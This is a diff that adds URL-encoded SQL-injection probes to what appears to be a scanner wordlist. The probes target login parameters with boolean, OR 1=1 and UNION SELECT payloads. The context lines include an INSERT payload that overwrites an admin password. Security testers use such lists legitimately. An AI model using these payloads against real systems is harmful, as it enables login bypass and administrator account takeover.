@@ -210,3 +210,10 @@ sha1("3fDf ", true) = ...
 union/*test*/select
 INSERT INTO users (email, password) VALUES ("attacker_dummy@example.com", "bcrypt_hash_of_qwerty"), ("admin@example.com", "bcrypt_hash_of_qwerty") ON DUPLICATE KEY UPDATE password="bcrypt_hash_of_qwerty" -- ", "bcrypt_hash_of_your_password_input");
 || 1=1
+#ZAP
+foo-bar%40example.com+AND+1%3D1+--+&pass=ZAP&token=ZAP
+foo-bar%40example.com+AND+1%3D2+--+&pass=ZAP
+foo-bar%40example.com+OR+1%3D1+--+&pass=ZAP
+foo-bar%40example.com+UNION+ALL+select+NULL+--+&pass=ZAP
+foo-bar%40example.com&pass=ZAP+OR+1%3D1+--+
+foo-bar%40example.com&pass=ZAP&token=ZAP+AND+1%3D1+--+
